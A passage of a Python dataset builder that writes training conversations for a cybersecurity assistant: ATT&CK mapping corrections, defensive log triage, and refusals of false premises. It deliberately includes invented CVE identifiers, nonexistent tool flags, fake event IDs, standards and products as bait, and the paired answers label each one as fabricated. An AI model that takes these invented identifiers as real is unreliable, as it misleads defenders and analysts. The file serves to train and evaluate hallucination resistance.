"""Dataset builder for Gemma4-CyberAi SFT v0.2.

Why a new builder (not an edit of `builder.py`)
-----------------------------------------------
`builder.py` reproduces the historical `sft_v0.1.jsonl` and is left frozen for
reproducibility. This module authors a *different*, higher-quality dataset and is
guaranteed distinct at the assistant-answer level.

What changed vs v0.1 (the concrete quality fixes)
-------------------------------------------------
* **No clone loops.** v0.1 wrapped ~91 unique answers in `for var in range(...)` loops
  that changed only "Case {N}", inflating to 360 rows with heavy duplication. v0.2
  authors each example once; a runtime guard (`_Deduper`) raises if any two assistant
  answers are identical, so superficial duplication cannot recur by construction.
* **Exact ATT&CK IDs are taught.** v0.1 never contained `T1558.003` (the ID the base
  model hallucinated as `T1060`). v0.2 derives an ATT&CK-precision + *contrastive*
  family directly from the verified fact registry (`data/knowledge/security_facts.json`),
  so training data, benchmark scorers, and the judge rubric all cite the SAME fact and
  cannot drift.
* **Contrastive correction.** Items explicitly reject the wrong IDs/mechanics (e.g. "it
  is NOT T1060 / not Privilege Escalation / the ticket does not contain a password hash").

Provenance/licensing: every item is original, project-authored content released under
`CC-BY-4.0`, matching `DATA_LICENSES.md` and the schema validator. No third-party or
proprietary (HTB/THM) content.
"""

from __future__ import annotations

from pathlib import Path

from gemma_cyber.data.schema import TrainingItem, TrainingMessage, TrainingMetadata
from gemma_cyber.knowledge import FactRegistry, load_fact_registry

PROVENANCE = "authored for gemma-cyber sft_v0.2"

SYS_RIGOROUS = (
    "You are a rigorous cybersecurity assistant. Reason carefully from facts. Flag "
    "non-existent or fabricated CVEs, tools, and commands rather than inventing details."
)
SYS_ANALYST = (
    "You are a careful cybersecurity analyst. Reason strictly from evidence. When "
    "evidence is incomplete or ambiguous, state the limits and list the missing data "
    "instead of speculating."
)
SYS_SOC = (
    "You are an expert SOC detection and log-triage analyst. Give structured, "
    "evidence-grounded analysis with clear, prioritized response guidance."
)
SYS_IR = (
    "You are a seasoned incident responder. Give prioritized, actionable containment, "
    "eradication, and forensic guidance, and preserve evidence."
)
SYS_DET = (
    "You are a detection-engineering specialist. Write precise detection logic and "
    "correct MITRE ATT&CK mappings with explicit field definitions."
)
SYS_AD = (
    "You are an Active Directory and Windows security architect. Explain domain "
    "protocols, attack mechanics, and defenses with technical accuracy and exact "
    "MITRE ATT&CK identifiers."
)
SYS_ATTACK = (
    "You are a MITRE ATT&CK specialist. Give the exact current technique ID, "
    "sub-technique, and primary tactic. Distinguish techniques from tactics and correct "
    "common mis-mappings. If unsure of a current mapping, say so rather than guessing."
)
SYS_EDU = (
    "You are a cybersecurity educator for authorized CTF labs and penetration-testing "
    "methodology. Explain concepts ethically with technical rigor."
)
SYS_FUND = (
    "You are a foundational cybersecurity instructor. Explain core principles, "
    "cryptography, and architecture precisely."
)
SYS_SAFE = (
    "You are an ethical cybersecurity assistant. Decline to produce weaponized exploits, "
    "unauthorized-access instructions, or malware, while explaining the relevant "
    "defensive principles and detections."
)


class _Deduper:
    """Collects items while guaranteeing distinct assistant answers and unique ids."""

    def __init__(self) -> None:
        self.items: list[TrainingItem] = []
        self._answers: set[str] = set()
        self._ids: set[str] = set()

    def add(
        self,
        item_id: str,
        system: str,
        user: str,
        assistant: str,
        *,
        task_type: str,
        domain: str,
        difficulty: str = "intermediate",
        requires_evidence: bool = True,
        fabricated_premise: bool = False,
        tags: list[str] | None = None,
    ) -> None:
        norm = " ".join(assistant.split()).lower()
        if norm in self._answers:
            raise ValueError(f"[{item_id}] duplicate assistant answer (superficial variation)")
        if item_id in self._ids:
            raise ValueError(f"[{item_id}] duplicate id")
        self._answers.add(norm)
        self._ids.add(item_id)
        self.items.append(
            TrainingItem(
                id=item_id,
                messages=[
                    TrainingMessage(role="system", content=system),
                    TrainingMessage(role="user", content=user),
                    TrainingMessage(role="assistant", content=assistant),
                ],
                metadata=TrainingMetadata(
                    task_type=task_type,  # type: ignore[arg-type]
                    domain=domain,  # type: ignore[arg-type]
                    difficulty=difficulty,  # type: ignore[arg-type]
                    requires_evidence=requires_evidence,
                    fabricated_premise=fabricated_premise,
                    source="original",
                    license="CC-BY-4.0",
                    provenance=PROVENANCE,
                    tags=tags or [],
                ),
            )
        )


# ==========================================================================================
# 1. ATT&CK precision + contrastive family — DERIVED FROM THE VERIFIED FACT REGISTRY.
#    This is legitimate programmatic diversity: each technique has a genuinely different
#    ID, tactic, and mechanics, so no two answers are alike.
# ==========================================================================================

def _attack_family(dd: _Deduper, reg: FactRegistry) -> None:
    for key in reg.technique_keys():
        t = reg.technique(key)
        facts = " ".join(f"- {f}" for f in t.key_facts)
        facts_block = "\n".join(f"- {f}" for f in t.key_facts)

        # (a) Primary: state the exact ID + tactic + mechanics.
        primary = (
            f"**{t.name}** maps to **MITRE ATT&CK {t.id}**"
            + (f" (a sub-technique of {t.parent_id})" if t.parent_id else "")
            + f", under the **{t.tactic} ({t.tactic_id})** tactic.\n\n"
            f"Key mechanics:\n{facts_block}"
        )
        dd.add(
            f"train-attack-{key}-primary",
            SYS_ATTACK,
            f"What is the MITRE ATT&CK technique ID and primary tactic for "
            f"{t.aliases[0]}, and how does it work?",
            primary,
            task_type="attack_mapping",
            domain="blue_team",
            difficulty="intermediate",
            requires_evidence=False,
            tags=["attack_mapping", "exact_id", key],
        )

        # (b) Contrastive: reject the common wrong IDs / claims for this technique.
        if t.forbidden_ids or t.forbidden_claims:
            wrong_ids = ", ".join(t.forbidden_ids) or "unrelated technique IDs"
            confusions = "\n".join(
                f"- **{bad}** is wrong here: {why}" for bad, why in t.confused_with.items()
            )
            bad_claims = "\n".join(f"- Incorrect: \"{c}\"." for c in t.forbidden_claims)
            body = [
                f"The correct mapping is **{t.id} — {t.name}**, tactic "
                f"**{t.tactic} ({t.tactic_id})**. Several plausible-sounding statements are "
                f"factually wrong:",
            ]
            if confusions:
                body.append(f"\n**Mis-mapped IDs ({wrong_ids}):**\n{confusions}")
            if bad_claims:
                body.append(f"\n**False mechanics:**\n{bad_claims}")
            body.append(f"\n**What is actually true:**\n{facts_block}")
            dd.add(
                f"train-attack-{key}-contrastive",
                SYS_ATTACK,
                f"A colleague claims {t.aliases[0]} is {t.forbidden_ids[0] if t.forbidden_ids else 'a different technique'} "
                f"and describes it loosely. Identify what is wrong and give the correct "
                f"ATT&CK mapping and mechanics.",
                "\n".join(body),
                task_type="attack_mapping",
                domain="blue_team",
                difficulty="advanced",
                requires_evidence=False,
                tags=["attack_mapping", "contrastive", "misconception", key],
            )

    # (c) The exact v0.1 failure, as an explicit correction target.
    k = reg.technique("kerberoasting")
    dd.add(
        "train-attack-kerberoasting-failure-correction",
        SYS_ATTACK,
        "Explain the MITRE ATT&CK technique for Kerberoasting. Is it T1060?",
        (
            "No — **Kerberoasting is not T1060**. `T1060` is an obsolete ID for "
            "*Registry Run Keys / Startup Folder* (a Persistence technique, now "
            "**T1547.001**) and has nothing to do with Kerberos.\n\n"
            f"Kerberoasting is **{k.id} — {k.name}**, a sub-technique of {k.parent_id}, "
            f"under **{k.tactic} ({k.tactic_id})** — *not* Privilege Escalation and *not* "
            "T1068 (Exploitation for Privilege Escalation).\n\n"
            "How it actually works:\n"
            "- Any authenticated domain user requests a **TGS** (service ticket) for an "
            "account that has a **Service Principal Name (SPN)** registered.\n"
            "- The DC encrypts part of that ticket with a key **derived from the service "
            "account's password** (its NTLM hash for RC4/etype 0x17). The attacker cracks "
            "that key **offline** — no failed logons on the DC.\n"
            "- The ticket does **not** contain any domain administrator password hash, and "
            "the discovery step is **SPN enumeration via LDAP**, not Nmap port scanning.\n\n"
            "Defense: gMSAs with long rotated passwords, enforce AES (disable RC4), and "
            "alert on Event ID 4769 with Ticket Encryption Type 0x17 from unusual hosts."
        ),
        task_type="attack_mapping",
        domain="blue_team",
        difficulty="advanced",
        requires_evidence=False,
        tags=["attack_mapping", "kerberoasting", "T1558.003", "contrastive", "correction"],
    )

    # (d) technique-vs-tactic distinction.
    dd.add(
        "train-attack-technique-vs-tactic",
        SYS_ATTACK,
        "Explain the difference between an ATT&CK tactic and a technique, using "
        "Credential Access as the example.",
        (
            "A **tactic** is the adversary's *goal* — the \"why\". A **technique** (and "
            "sub-technique) is *how* they achieve it. They live at different layers of the "
            "ATT&CK matrix and use different ID formats.\n\n"
            "- **Tactic:** *Credential Access* has ID **TA0006** (TA-prefixed). It is a "
            "column in the matrix, not something you 'map an action to' directly.\n"
            "- **Techniques under it** carry T-prefixed IDs, e.g. **T1558.003** "
            "(Kerberoasting), **T1003.001** (LSASS Memory), **T1110.003** (Password "
            "Spraying).\n\n"
            "So \"the tactic is T1558.003\" is a category error: T1558.003 is a technique; "
            "its tactic is TA0006. Map an observed behavior to a **technique ID**, then "
            "note which **tactic** it serves."
        ),
        task_type="attack_mapping",
        domain="blue_team",
        difficulty="intermediate",
        requires_evidence=False,
        tags=["attack_mapping", "technique_vs_tactic"],
    )
    _ = facts  # readability: key_facts already rendered above


# ==========================================================================================
# 2. Hallucination refusal & fabricated premises (fake CVEs / tools / products).
#    Each row is genuinely distinct (different artifact + different reason it is invalid).
# ==========================================================================================

def _hallucination_family(dd: _Deduper) -> None:
    fake_cves = [
        ("CVE-2029-44019", "the Linux kernel 6.12", "a zero-click eBPF privilege escalation"),
        ("CVE-2028-10492", "OpenSSH 9.8p1", "a pre-auth remote root in protocol negotiation"),
        ("CVE-2030-00192", "Google Chrome 140", "a V8 WebAssembly sandbox escape"),
        ("CVE-2028-99214", "Fortinet FortiOS 7.4.3", "an SSL-VPN unauthenticated command injection"),
        ("CVE-2029-77182", "Cisco IOS-XE 17.9", "a RESTCONF unauthenticated admin account creation"),
        ("CVE-2029-00991", "Samba 4.19 as an AD DC", "a DCERPC remote code execution"),
        ("CVE-2028-70192", "Kubernetes 1.30", "a kube-apiserver aggregation-layer auth bypass"),
        ("CVE-2027-88311", "Apache HTTP Server 2.4.60", "an HTTP/3 pseudo-header RCE"),
        ("CVE-2029-33812", "Docker Engine 26.1", "a containerd shim host breakout"),
        ("CVE-2028-88129", "Elasticsearch 8.13", "a painless-scripting sandbox escape"),
        ("CVE-2031-10001", "PostgreSQL 17.2", "a PL/pgSQL search_path arbitrary function call"),
        ("CVE-2028-44120", "Wireshark 4.2.5", "a TLS 1.3 dissector integer overflow"),
        ("CVE-2029-19283", "Windows Defender", "a real-time engine remote memory corruption"),
        ("CVE-2028-22910", "Jenkins Core 2.450", "a remoting-protocol Java deserialization"),
        ("CVE-2030-51001", "GitLab CE 18.0", "a CI runner token leak via GraphQL"),
        ("CVE-2031-70044", "MongoDB 8.2", "an aggregation-pipeline server-side JS injection"),
        ("CVE-2029-88002", "HAProxy 3.2", "an HTTP/2 header-frame use-after-free"),
        ("CVE-2030-12345", "Keycloak 26.1", "an OIDC token-exchange privilege escalation"),
        ("CVE-2028-33190", "VMware ESXi 9.0", "an SLP heap overflow pre-auth RCE"),
        ("CVE-2031-40021", "containerd 2.1", "a CRI socket race host escape"),
        ("CVE-2029-55510", "Grafana 12.0", "an SSRF-to-RCE via the datasource proxy"),
        ("CVE-2030-99120", "MariaDB 11.5", "an InnoDB redo-log parsing overflow"),
        ("CVE-2028-11777", "Squid Proxy 6.9", "a Gopher-scheme request smuggling"),
        ("CVE-2031-22030", "OpenVPN 2.7", "a control-channel packet type confusion"),
        ("CVE-2029-30303", "Zabbix 7.2", "an authenticated SQLi in the trapper listener"),
        ("CVE-2030-60600", "RabbitMQ 4.1", "an AMQP frame parser out-of-bounds read"),
        ("CVE-2028-70707", "Traefik 3.3", "a middleware header-injection auth bypass"),
        ("CVE-2031-33044", "Ansible 12.0", "a vault-decrypt template-injection RCE"),
        ("CVE-2029-91002", "Terraform 1.12", "a provider-plugin supply-chain backdoor"),
        ("CVE-2030-40404", "Prometheus 3.1", "an unauthenticated admin API remote write"),
        ("CVE-2028-60123", "Consul 1.20", "an ACL bypass via token-prefix collision"),
        ("CVE-2031-77012", "MinIO 2031", "a presigned-URL signature bypass"),
        ("CVE-2029-10110", "Envoy 1.34", "an HTTP/2 CONTINUATION-flood memory exhaustion RCE"),
        ("CVE-2030-22233", "Argo CD 3.0", "a repo-server manifest template RCE"),
        ("CVE-2028-45090", "Vault 1.19", "an auth-method mount arbitrary policy escalation"),
    ]
    for i, (cve, target, claim) in enumerate(fake_cves, 1):
        year = cve.split("-")[1]
        dd.add(
            f"train-halluc-cve-{i:02d}",
            SYS_RIGOROUS,
            f"Give the official patch and a working proof-of-concept for {cve} in "
            f"{target}, which is {claim}.",
            (
                f"I can't do that: **{cve} is not a valid published CVE identifier**, so "
                f"there is no authoritative advisory or PoC to give.\n\n"
                f"- The year field ({year}) is in the future, which alone means it cannot be "
                f"an assigned record today.\n"
                f"- Nothing for this ID exists in the NVD (nvd.nist.gov) or the CVE Program "
                f"(cve.org).\n\n"
                f"To verify a real issue in {target.split(' as ')[0]}, check the vendor's "
                f"security advisories and confirm the exact identifier in NVD before acting "
                f"on any claimed exploit."
            ),
            task_type="hallucination_refusal",
            domain="general",
            difficulty="intermediate",
            requires_evidence=False,
            fabricated_premise=True,
            tags=["fake_cve", "hallucination_rejection"],
        )

    fake_tools = [
        ("nmap --autopwn-network --force-root", "nmap", "auto-exploit every host on a subnet"),
        ("hashcat --recover-plaintext-seedless", "hashcat", "recover plaintext with no wordlist or mask"),
        ("john --reverse-sha512-algebraic", "john", "algebraically invert SHA-512"),
        ("aircrack-ng --instant-wpa3-crack", "aircrack-ng", "instantly crack a WPA3 SAE handshake"),
        ("tcpdump --decrypt-tls-keys -i any", "tcpdump", "decrypt live TLS on the wire"),
        ("metasploit --auto-bypass-all-edr", "msfconsole", "bypass every commercial EDR in one flag"),
        ("burp --crack-jwt-private-key", "burpsuite", "factor a 4096-bit RSA key from a JWT header"),
        ("sqlmap --convert-to-rootkit --target-os linux", "sqlmap", "turn SQLi into a kernel rootkit"),
        ("gobuster --auto-bypass-waf --dump-database", "gobuster", "dump a backend database while brute-forcing dirs"),
        ("hydra --instant-2fa-crack -s 443", "hydra", "instantly bypass multi-factor authentication"),
        ("nikto --kernel-exploit-server", "nikto", "drop a kernel exploit on the scanned server"),
        ("masscan --exploit-smb-all", "masscan", "auto-run SMB exploits while port scanning"),
        ("wireshark --decrypt-all-passwords -i eth0", "wireshark", "auto-decrypt every password on the wire"),
        ("nuclei --auto-root --chain-all-cves", "nuclei", "chain every known CVE to auto-root a target"),
        ("responder --auto-crack-ntlmv2-live", "responder", "crack captured NetNTLMv2 in real time with no wordlist"),
        ("bloodhound --auto-domain-admin-path exec", "bloodhound", "automatically execute the shortest path to Domain Admin"),
        ("crackmapexec --pass-the-everything", "crackmapexec", "authenticate to any host with any credential type automatically"),
        ("ffuf --extract-server-source", "ffuf", "extract complete server-side source via HTTP headers"),
    ]
    for i, (cmd, tool, claim) in enumerate(fake_tools, 1):
        dd.add(
            f"train-halluc-tool-{i:02d}",
            SYS_RIGOROUS,
            f"How do I run `{cmd}` to {claim}?",
            (
                f"That command won't run: **those flags don't exist in {tool}**, and the "
                f"claimed capability is not real.\n\n"
                f"- {tool} is a legitimate tool, but it has no option that performs "
                f"\"{claim}\"; the flags shown are fabricated.\n"
                f"- The claimed outcome also violates basic cryptographic/network limits — "
                f"no supported release does this.\n\n"
                f"Check `{tool} --help` or `man {tool}` for the real options, and use the "
                f"tool for its documented purpose within an authorized scope."
            ),
            task_type="hallucination_refusal",
            domain="offensive_ctf",
            difficulty="intermediate",
            requires_evidence=False,
            fabricated_premise=True,
            tags=["fake_flags", "tool_boundaries"],
        )

    fake_events = [
        ("Windows Security Event ID 9001", "records the plaintext password of every logon"),
        ("Sysmon Event ID 42", "logs the attacker's real-world identity"),
        ("Windows Event ID 4625.5", "confirms which malware family caused a failed logon"),
        ("Windows Event ID 8888", "lists every file an attacker exfiltrated"),
        ("Sysmon Event ID 30", "flags a process as malicious with a verdict field"),
        ("Windows Event ID 4624.9", "records the attacker's geographic city on logon"),
    ]
    for i, (evt, claim) in enumerate(fake_events, 1):
        dd.add(
            f"train-halluc-event-{i:02d}",
            SYS_RIGOROUS,
            f"Use {evt}, which {claim}, to complete my investigation.",
            (
                f"**{evt} is not a real event definition**, and no Windows/Sysmon event "
                f"\"{claim}\" — that capability does not exist.\n\n"
                f"Windows never logs plaintext passwords, and no event attributes real-world "
                f"identity or malware family on its own. Work from documented events (e.g. "
                f"4624/4625 logon, 4688 process creation, Sysmon 1/3/10/11) and correlate "
                f"across sources rather than relying on an invented event ID."
            ),
            task_type="hallucination_refusal",
            domain="blue_team",
            difficulty="intermediate",
            requires_evidence=False,
            fabricated_premise=True,
            tags=["fake_event_id", "hallucination_rejection"],
        )

    fake_rfcs = [
        ("RFC 9999", "a 'mandatory plaintext-password recovery' extension to TLS 1.3"),
        ("RFC 8888.1", "a Kerberos option that returns account passwords to any client"),
        ("RFC 10500", "an HTTP header that disables all server-side authentication"),
    ]
    for i, (rfc, claim) in enumerate(fake_rfcs, 1):
        dd.add(
            f"train-halluc-rfc-{i:02d}",
            SYS_RIGOROUS,
            f"Implement {rfc}, which defines {claim}.",
            (
                f"I can't implement that: **{rfc} does not define {claim}**, and such a "
                f"mechanism would contradict how these protocols are designed.\n\n"
                f"TLS 1.3, Kerberos, and HTTP have no standard that hands out plaintext "
                f"passwords or globally disables authentication — that would be a "
                f"vulnerability, not a feature. Verify any RFC number and its actual scope at "
                f"rfc-editor.org before building to it."
            ),
            task_type="hallucination_refusal", domain="general", difficulty="intermediate",
            requires_evidence=False, fabricated_premise=True,
            tags=["fake_rfc", "hallucination_rejection"],
        )

    fake_attack_ids = [
        ("T9999.001", "Kerberos Quantum Ticket Forgery"),
        ("T1558.099", "Kerberoasting via DNS"),
        ("T1003.099", "Cloud LSASS Dumping"),
        ("TA0099", "the 'Ransom Negotiation' tactic"),
    ]
    for i, (fid, claim) in enumerate(fake_attack_ids, 1):
        dd.add(
            f"train-halluc-attackid-{i:02d}",
            SYS_ATTACK,
            f"Summarize MITRE ATT&CK {fid} ({claim}) and its detections.",
            (
                f"**{fid} is not a valid MITRE ATT&CK identifier**, and there is no technique or "
                f"tactic called \"{claim}\". I won't invent detections for it.\n\n"
                f"Technique IDs look like `T####` with optional `.###` sub-techniques, and "
                f"tactics use `TA####` — but the specific number must actually exist in the "
                f"current ATT&CK matrix. Verify IDs at attack.mitre.org. If you meant a real "
                f"technique (e.g. Kerberoasting is **T1558.003**), I can cover that."
            ),
            task_type="hallucination_refusal", domain="blue_team", difficulty="advanced",
            requires_evidence=False, fabricated_premise=True,
            tags=["fake_attack_id", "attack_mapping", "hallucination_rejection"],
        )

    fake_protocols = [
        ("SAKP (Secure Auto-Key Protocol)", "auto-negotiates encryption with zero key exchange"),
        ("QuantumAuth v2", "authenticates users with no secret, credential, or token"),
    ]
    for i, (proto, claim) in enumerate(fake_protocols, 1):
        dd.add(
            f"train-halluc-proto-{i:02d}",
            SYS_RIGOROUS,
            f"How do I configure {proto}, which {claim}?",
            (
                f"**{proto} is not a real protocol**, and \"{claim}\" is cryptographically "
                f"impossible — you cannot establish a shared key with no key exchange, nor "
                f"authenticate an identity with no secret or token. There is nothing to "
                f"configure. Use established, reviewed protocols (TLS 1.3, Kerberos, OIDC/"
                f"OAuth2, FIDO2) instead of an invented one."
            ),
            task_type="hallucination_refusal", domain="general", difficulty="intermediate",
            requires_evidence=False, fabricated_premise=True,
            tags=["fake_protocol", "impossible_claim"],
        )

    fake_standards = [
        ("NIST SP 800-999", "requires storing user passwords in reversible encryption"),
        ("ISO 27099", "mandates a shared master backdoor key for all certified firewalls"),
        ("PCI-DSS 5.0 Requirement 13", "permits transmitting full card PANs in cleartext logs"),
        ("OWASP Top 1", "declares SQL injection officially unexploitable since 2027"),
    ]
    for i, (std, claim) in enumerate(fake_standards, 1):
        dd.add(
            f"train-halluc-std-{i:02d}",
            SYS_RIGOROUS,
            f"Cite the section of {std} that {claim}, so I can comply.",
            (
                f"I can't cite that: **no such requirement exists**. {std.split(' Requirement')[0]} "
                f"does not \"{claim}\" — that would contradict the framework's actual security "
                f"goals (reversible password storage, shared backdoor keys, and cleartext card "
                f"data are exactly what these standards prohibit). Verify requirements against "
                f"the official published standard rather than a paraphrased claim."
            ),
            task_type="hallucination_refusal", domain="general", difficulty="intermediate",
            requires_evidence=False, fabricated_premise=True,
            tags=["fake_standard", "hallucination_rejection"],
        )

    fake_products = [
        ("QuantumShield AI OS 12", "a default root backdoor password"),
        ("HyperVault ZeroTrust 2029", "the master recovery bypass key"),
        ("IronClad Bastion Server 8.0", "the emergency backdoor token"),
        ("ZeroBreach AI Appliance 400", "the guaranteed root-shell extraction command"),
        ("OmniDefense EDR Pro X", "the universal EDR bypass configuration string"),
        ("TitaniumLock Kerberos Proxy", "the master ticket-generation password"),
        ("NeuroGuard Deep Packet Firewall", "the Layer 1 neural bypass rule syntax"),
        ("VortexSIEM Enterprise 2030", "the undocumented REST admin token"),
        ("ApexShield WAF", "the universal SQLi-evasion header"),
        ("SpectraGuard Memory Defense", "the kernel bypass interrupt sequence"),
    ]
    for i, (prod, detail) in enumerate(fake_products, 1):
        dd.add(
            f"train-halluc-prod-{i:02d}",
            SYS_RIGOROUS,
            f"What is {detail} for {prod}?",
            (
                f"I can't provide {detail}: **{prod} is not a real, documented product**, "
                f"and legitimate security appliances do not ship universal 'master backdoor' "
                f"credentials in the first place.\n\n"
                f"There's no commercial or open-source product by that name with a published "
                f"bypass. For real systems, manage administrative access through the vendor's "
                f"documented procedures and your identity provider — never a hardcoded master "
                f"key."
            ),
            task_type="hallucination_refusal",
            domain="general",
            difficulty="intermediate",
            requires_evidence=False,
            fabricated_premise=True,
            tags=["fake_product", "hallucination_rejection"],
        )


# ==========================================================================================
# 3. Insufficient evidence — each scenario has distinct evidence AND a tailored answer.
# ==========================================================================================

def _insufficient_family(dd: _Deduper) -> None:
    scen = [
        ("ssh-drop",
         "FIREWALL DROP SRC=198.51.100.14 DST=10.0.1.20 PROTO=TCP SPT=49152 DPT=22 ACTION=DENY",
         "Who is the APT group behind this SSH attempt and what data did they exfiltrate?",
         "a single blocked packet cannot reveal actor identity, group affiliation, or any "
         "exfiltration",
         "The firewall DENIED the connection, so no session was established and nothing could "
         "be exfiltrated through it. A one-line drop shows a source IP probing port 22 — "
         "nothing about who they are.",
         "netflow/PCAP for any *allowed* traffic to this host, authentication logs on 10.0.1.20, "
         "and threat-intel context for 198.51.100.14 (which at most suggests scanning, not "
         "attribution)"),
        ("http-404",
         "192.0.2.88 - - [24/Aug/2026:14:22:01 +0000] \"GET /test.php HTTP/1.1\" 404 162",
         "Which zero-day was successfully exploited on our web server in this request?",
         "a 404 for /test.php is a *failed* request for a page that does not exist — it is "
         "evidence of scanning, not of any exploitation, let alone a zero-day",
         "The status code 404 and 162-byte body indicate the server returned its not-found "
         "page. No parameters, no 200, no payload.",
         "the full request line and body for any 200/500 responses, WAF logs, and app/error "
         "logs around this timestamp before claiming exploitation"),
        ("dns-single",
         "client 10.10.4.5: query: update.microsoft.com IN A + (10.10.0.1)",
         "Confirm this host is compromised with C2 beaconing malware.",
         "one benign-looking DNS A query to a legitimate Microsoft update domain cannot "
         "confirm compromise or beaconing",
         "update.microsoft.com is expected traffic. Beaconing is inferred from *periodicity*, "
         "volume, and destination reputation over time — none of which a single query shows.",
         "a time series of this host's DNS/NetFlow, the resolved IPs, and process-to-connection "
         "attribution before alleging C2"),
        ("oom",
         "web-01 kernel: Out of memory: Kill process 1829 (mysqld) score 450 or sacrifice child",
         "Which cyber attack crashed the database at this time?",
         "an OOM-killer message is an operating-system resource event, not by itself evidence "
         "of an attack",
         "The kernel terminated mysqld to reclaim memory. That is commonly a capacity/config "
         "issue (workload spike, memory limit) — attack is only one of several hypotheses.",
         "memory/CPU trends, slow-query and connection logs, and any correlated web traffic "
         "spike; only then can you distinguish load from a deliberate resource-exhaustion attack"),
        ("edr-ps",
         "Process spawned: powershell.exe on WORKSTATION-19 at 09:30:11 UTC. Parent PID: 412.",
         "Was this ransomware, and which files did it encrypt?",
         "the bare fact that powershell.exe started says nothing about intent or file impact",
         "PowerShell runs constantly for legitimate administration. Without the command line, "
         "the parent image, signer, and subsequent file/registry activity, intent is unknown.",
         "the full command line, parent process image, script-block logging (4104), and any "
         "file-modification telemetry before calling it ransomware"),
        ("icmp",
         "[1:1000001:1] PROTOCOL-ICMP Large ICMP Echo Request 198.51.100.99 -> 10.0.0.1",
         "Confirm this ping is exfiltration and extract the stolen card numbers from the payload.",
         "a single large-ICMP alert cannot confirm exfiltration, and the alert does not include "
         "decoded payload contents to 'extract' anything from",
         "Large ICMP can be tunneling, but it is also produced by MTU discovery, monitoring, and "
         "misconfiguration. One alert with no payload capture proves nothing about card data.",
         "the actual ICMP payloads (PCAP), a baseline of normal ICMP for this pair, and endpoint "
         "context before asserting data theft"),
        ("rdp-login",
         "AUDIT: User 'asmith' logged on from 10.0.0.45 via RDP (Logon Type 10) at 08:00.",
         "Confirm asmith is a malicious insider stealing intellectual property.",
         "a single successful RDP logon is normal activity and cannot establish malicious intent "
         "or data theft",
         "Logon Type 10 (RemoteInteractive) at 08:00 from an internal IP is consistent with a "
         "normal workday. Intent and IP theft are conclusions the log does not support.",
         "asmith's baseline logon pattern, whether 10.0.0.45 is their assigned host, and any "
         "file-access/DLP telemetry before alleging insider theft"),
        ("temp-file",
         "ALERT: file C:\\Windows\\Temp\\tmp994.tmp created on HOST-PROD-01 at 04:12 UTC.",
         "Give the full nation-state attribution and initial-access vector for this file.",
         "a temp-file-creation alert with no hash, no writer process, and no content cannot "
         "yield attribution or an access vector",
         "Temp files are created constantly by legitimate software. Nothing here identifies the "
         "writing process, the file's contents, or how anything got onto the host.",
         "the creating process (Sysmon 11 + parent), the file hash/signature, and any preceding "
         "network/logon events before attributing anything"),
        ("beacon-claim",
         "NETFLOW: 10.0.2.15:443 -> 93.184.216.34:443 Bytes=1504 Packets=2 Duration=0.01s",
         "Extract the decrypted TLS payload and show the stolen credentials in this flow.",
         "NetFlow records metadata only (no packet contents), so there is no payload to decrypt, "
         "and one 1.5 KB flow shows nothing about credentials",
         "This is a tiny, brief HTTPS flow. NetFlow never carries payload, and TLS content is "
         "encrypted; 'decrypting the flow' is not possible from this record.",
         "full PCAP with TLS keys (or endpoint TLS logging), plus destination reputation and a "
         "traffic baseline, before claiming credential theft"),
        ("va-cvss-only",
         "A scanner reports CVE-2021-44228 (Log4Shell) 'detected' on 10.0.9.5 with CVSS 10.0.",
         "Confirm the host is already breached via this vulnerability.",
         "a vulnerability being present is not evidence it was exploited or that a breach "
         "occurred; CVSS measures potential severity, not that an incident happened",
         "The scanner reports the software is vulnerable. It says nothing about exploitation, "
         "outbound JNDI callbacks, or attacker activity on the host.",
         "endpoint/EDR evidence of exploitation (child processes of the Java app, outbound LDAP), "
         "and network logs for the callback, before declaring a breach — then patch regardless"),
        ("phish-one-click",
         "A user clicked a link in a phishing email at 09:12; the URL now returns 404.",
         "Confirm the user's workstation is infected with malware and list the payload's actions.",
         "a click on a now-dead link does not establish that any payload ran or that the host is "
         "infected",
         "The link is dead, and there is no endpoint telemetry here. A click may deliver nothing "
         "(no download, blocked, sandboxed) — infection is a hypothesis, not a fact.",
         "browser/proxy logs for any download after the click, EDR process/file activity on the "
         "workstation, and the email's actual payload, before concluding infection"),
        ("geoip-attrib",
         "A successful VPN login for a user came from an IP that GeoIP places in another country.",
         "Confirm this is a nation-state attacker from that country.",
         "a GeoIP country is not attribution; VPNs, proxies, travel, and inaccurate GeoIP all "
         "produce foreign source IPs for legitimate logins",
         "GeoIP maps an IP to an approximate location, which is easily masked or simply wrong. A "
         "single foreign login proves neither compromise nor nation-state involvement.",
         "whether the user was travelling/using a VPN, device and MFA context, impossible-travel "
         "analysis, and session behavior, before treating it as malicious"),
    ]
    for key, ev, q, cannot, shows, missing in scen:
        dd.add(
            f"train-insuf-{key}",
            SYS_ANALYST,
            f"Evidence:\n```\n{ev}\n```\nQuestion: {q}",
            (
                f"Based strictly on this evidence, **that cannot be concluded** — {cannot}.\n\n"
                f"**What the evidence actually shows:** {shows}\n\n"
                f"**What is missing:** To move forward you would need {missing}.\n\n"
                f"State findings at the level the evidence supports, and flag the rest as "
                f"unknown rather than asserting a specific confident answer."
            ),
            task_type="insufficient_evidence",
            domain="blue_team",
            difficulty="advanced",
            requires_evidence=True,
            tags=["insufficient_evidence", "forensic_restraint", key],
        )


# ==========================================================================================
# 4. Log analysis — distinct real log patterns, each with a tailored analysis.
# ==========================================================================================

def _log_family(dd: _Deduper) -> None:
    scen = [
        ("ssh-bruteforce-success",
         "Aug 24 03:10:01 srv sshd[1101]: Failed password for invalid user admin from 198.51.100.77 port 41200 ssh2\n"
         "Aug 24 03:10:05 srv sshd[1105]: Failed password for invalid user oracle from 198.51.100.77 port 41204 ssh2\n"
         "Aug 24 03:10:08 srv sshd[1108]: Accepted password for deploy from 198.51.100.77 port 41208 ssh2",
         "Identify the attack pattern, the critical event, and immediate containment.",
         "**Pattern:** automated SSH password guessing from `198.51.100.77` against common "
         "usernames (`admin`, `oracle`).\n"
         "**Critical event:** at 03:10:08 `Accepted password for deploy` — a **successful "
         "compromise** of the `deploy` account from the same source.\n\n"
         "**Containment:** block `198.51.100.77` at the perimeter; kill `deploy`'s sessions; "
         "rotate its password and `authorized_keys`; then inspect `~deploy/.ssh`, running "
         "processes, cron, and `/tmp` for persistence."),
        ("win-4625-4624-svc",
         "Event 4625: account svc_sql failed to log on. Logon Type 3. Source 10.0.5.99. (x45 in 60s)\n"
         "Event 4624: account svc_sql logged on. Logon Type 3. Source 10.0.5.99.",
         "Interpret these Windows events, explain Logon Type 3, and give the next step.",
         "**Logon Type 3 = network logon** (SMB share, IIS, RPC/WMI) with no interactive "
         "desktop.\n"
